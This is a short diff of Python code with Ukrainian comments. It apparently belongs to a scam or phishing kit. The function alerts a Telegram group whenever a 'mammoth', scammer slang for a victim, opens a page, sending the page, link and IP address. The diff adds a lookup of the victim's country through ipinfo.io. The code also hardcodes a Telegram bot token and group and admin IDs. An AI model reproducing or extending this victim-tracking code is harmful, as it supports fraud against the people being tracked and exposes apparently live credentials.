@@ -14,6 +14,15 @@ def send_telegram_log(page, link, ip, country=""):
     BOT_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"  # токен з main.py
     GROUP_ID = -828011200  # group id з main.py
     ADMIN_ID = 7973971109   # ваш admin id (залишаємо той самий)
+    # Визначаємо країну за IP, якщо не передано
+    if not country:
+        try:
+            resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=2)
+            if resp.status_code == 200:
+                data = resp.json()
+                country = data.get("country", "")
+        except Exception:
+            country = ""
     msg = (
         f"⚠️ Мамонт открыл страницу\n"
         f"📄 Страница: {page}\n"
